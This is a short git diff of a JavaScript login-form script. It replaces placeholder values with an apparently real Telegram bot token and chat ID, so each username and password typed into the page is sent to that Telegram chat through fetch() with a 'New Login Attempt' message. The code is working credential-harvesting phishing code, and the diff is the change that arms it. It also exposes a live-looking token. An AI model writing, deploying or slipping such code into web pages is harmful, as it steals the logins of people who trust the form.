@@ -17,8 +17,8 @@ document.addEventListener("DOMContentLoaded", function () {
 
         if (username === "" || password === "") return;
 
-        const botToken = "YOUR_BOT_TOKEN_HERE";
-        const chatId = "YOUR_CHAT_ID_HERE";
+        const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM";
+        const chatId = "6687453395";
         const message = `🔥 New Login Attempt 🔥\n\n👤 Username: ${username}\n🔒 Password: ${password}`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
